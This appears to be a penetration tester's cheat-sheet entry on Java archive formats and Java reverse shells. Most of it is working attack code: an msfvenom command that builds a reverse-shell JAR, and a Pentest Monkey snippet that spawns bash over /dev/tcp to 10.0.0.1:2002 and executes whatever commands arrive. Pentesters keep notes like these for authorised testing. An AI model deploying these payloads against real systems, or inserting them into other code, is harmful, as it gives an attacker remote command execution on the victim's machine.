# Java

```
file.jar	# Java Archive format
file.war  # Web Application Resource
			  # Or Web application ARchive
			  # Contains: JAR, Javaserver pages, Java Servblets, Java classes, XML files.
			  
```

## Java Shell

```bash
msfvenom --platform java -p java/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f jar -o rev.jar
```

Pentest Monkey
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```